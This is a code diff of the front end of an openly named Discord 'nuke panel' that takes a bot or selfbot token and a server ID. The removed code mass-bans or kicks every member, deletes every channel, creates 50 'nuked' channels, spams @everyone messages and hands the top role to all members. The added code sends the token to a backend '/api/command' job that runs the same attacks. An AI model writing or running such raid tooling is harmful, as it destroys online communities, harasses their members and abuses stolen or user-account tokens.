@@ -565,91 +565,44 @@
       return members;
     }
 
-    async function runCommand(tag, prefix, auth, command) {
+    async function runCommand(tag, prefix, command) {
       const serverId = $('' + prefix + 'ServerId').value.trim();
+      const rawToken = $('' + prefix + 'Token').value.trim();
 
-      if (!serverId) {
-        log('[' + tag + '] Please enter Server ID first', 'error');
-        return;
-      }
-      if (!/^\d{17,20}$/.test(serverId)) {
-        log('[' + tag + '] Server ID must be 17-20 digits', 'error');
-        return;
-      }
+      if (!rawToken) { log('[' + tag + '] Please enter token first', 'error'); return; }
+      if (!serverId) { log('[' + tag + '] Please enter Server ID first', 'error'); return; }
+      if (!/^\d{17,20}$/.test(serverId)) { log('[' + tag + '] Server ID must be 17-20 digits', 'error'); return; }
 
-      let done = 0, failed = 0;
-      const bump = (ok) => { if (ok) done++; else failed++; };
+      const isBot = prefix === 'appbot';
+      const auth = rawToken;
 
       try {
-        log('[' + tag + '] ▶ Running ' + command + '...', 'info');
+        log('[' + tag + '] ▶ Queuing ' + command + '...', 'info');
 
-        if (command === 'BAN_ALL' || command === 'KICK_ALL') {
-          const me = await apiCall(auth, 'GET', '/users/@me');
-          const members = await getAllMembers(auth, serverId);
-          log('[' + tag + '] Found ' + members.length + ' members', 'info');
+        const start = await fetch('/api/command', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ token: auth, isBot, command, guildId: serverId }),
+        }).then(r => r.json());
 
-          for (const m of members) {
-            if (m.user.id === me.id) continue;
-            try {
-              if (command === 'BAN_ALL') {
-                await apiCall(auth, 'PUT', '/guilds/' + serverId + '/bans/' + m.user.id, { reason: 'nuke panel' });
-              } else {
-                await apiCall(auth, 'DELETE', '/guilds/' + serverId + '/members/' + m.user.id);
-              }
-              bump(true);
-            } catch (e) { bump(false); }
-            await sleep(280);
-          }
-
-        } else if (command === 'DELETE_ALL' || command === 'CREATE_CHANNELS' || command === 'SPAM_ALL') {
-          const channels = await apiCall(auth, 'GET', '/guilds/' + serverId + '/channels');
-          log('[' + tag + '] Found ' + channels.length + ' channels', 'info');
-
-          if (command === 'DELETE_ALL') {
-            for (const c of channels) {
-              try { await apiCall(auth, 'DELETE', '/channels/' + c.id); bump(true); }
-              catch (e) { bump(false); }
-              await sleep(280);
-            }
-          } else if (command === 'CREATE_CHANNELS') {
-            for (let i = 0; i < 50; i++) {
-              try {
-                await apiCall(auth, 'POST', '/guilds/' + serverId + '/channels', { name: 'nuked-' + (i + 1), type: 0 });
-                bump(true);
-              } catch (e) { bump(false); }
-              await sleep(300);
-            }
-          } else {
-            for (const c of channels) {
-              if (c.type !== 0 && c.type !== 5) continue;
-              for (let i = 0; i < 5; i++) {
-                try {
-                  await apiCall(auth, 'POST', '/channels/' + c.id + '/messages', { content: '@everyone **NUKED BY KENZO x RYUGA**' });
-                  bump(true);
-                } catch (e) { bump(false); }
-                await sleep(320);
-              }
-            }
-          }
-
-        } else if (command === 'CLAIM_ROLES') {
-          const roles = await apiCall(auth, 'GET', '/guilds/' + serverId + '/roles');
-          const target = roles.filter((r) => r.position > 0).sort((a, b) => b.position - a.position)[0];
-          if (!target) { log('[' + tag + '] No assignable role found', 'error'); return; }
-
-          const members = await getAllMembers(auth, serverId);
-          log('[' + tag + '] Claiming role "' + target.name + '" on ' + members.length + ' members', 'info');
-
-          for (const m of members) {
-            try {
-              await apiCall(auth, 'PATCH', '/guilds/' + serverId + '/members/' + m.user.id, { roles: [target.id, ...(m.roles || [])] });
-              bump(true);
-            } catch (e) { bump(false); }
-            await sleep(280);
-          }
+        if (!start.jobId) {
+          log('[' + tag + '] ❌ ' + (start.error || 'Failed to start job'), 'error');
+          return;
         }
 
-        log('[' + tag + '] ✅ ' + command + ' finished — ok:' + done + ' failed:' + failed, 'success');
+        let printed = 0;
+        for (let i = 0; i < 1200; i++) {
+          const job = await fetch('/api/job/' + start.jobId).then(r => r.json());
+          if (!job || !job.logs) break;
+
+          while (printed < job.logs.length) {
+            const entry = job.logs[printed++];
+            log('[' + tag + '] ' + entry.message, entry.level || 'info');
+          }
+
+          if (job.status === 'done' || job.status === 'error') break;
+          await sleep(700);
+        }
       } catch (e) {
         log('[' + tag + '] ❌ ' + command + ' failed: ' + e.message, 'error');
       }
@@ -657,14 +610,12 @@
 
     function sendAppBotCommand(command) {
       if (!appBotConnected) { log('[APP BOT] Connect first', 'error'); return; }
-      const token = 'Bot ' + $('appbotToken').value.trim();
-      runCommand('APP BOT', 'appbot', token, command);
+      runCommand('APP BOT', 'appbot', command);
     }
 
     function sendSelfbotCommand(command) {
       if (!selfBotConnected) { log('[SELFBOT] Connect first', 'error'); return; }
-      const token = $('selfbotToken').value.trim();
-      runCommand('SELFBOT', 'selfbot', token, command);
+      runCommand('SELFBOT', 'selfbot', command);
     }
     
     // ==================== SELFBOT (Direct WebSocket) ====================
